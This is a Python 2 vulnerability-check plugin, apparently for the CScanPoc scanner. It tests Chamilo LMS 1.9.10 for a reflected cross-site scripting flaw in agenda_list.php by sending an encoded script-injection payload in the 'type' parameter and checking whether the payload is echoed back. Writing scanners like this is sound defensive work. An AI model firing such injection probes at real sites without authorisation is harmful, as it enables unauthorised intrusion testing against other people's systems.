# coding: utf-8
import urllib2
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Chamilo_LMS_0101' # 平台漏洞编号，留空
    name = 'Chamilo LMS 1.9.10 /main/calendar/agenda_list.php 跨站脚本' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2015-03-20'  # 漏洞公布时间
    desc = '''
    Chamilo LMS 1.9.10 /main/calendar/agenda_list.php 跨站脚本漏洞。
    ''' # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/36435/', # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' # cve编号
    product = 'Chamilo_LMS'  # 漏洞应用名称
    product_version = '1.9.10'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cc3e249f-5a4f-49f9-b189-b9fa91f2c84a' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            url = self.target + '/main/calendar/agenda_list.php'
            verify_url = url + '?type=personal%27%3E%3Cscript%3Econfirm%281%29%3C%2fscript%3E%3C%21--'
            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)
            content = response.read()
            if "<script>confirm(1)</script>" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()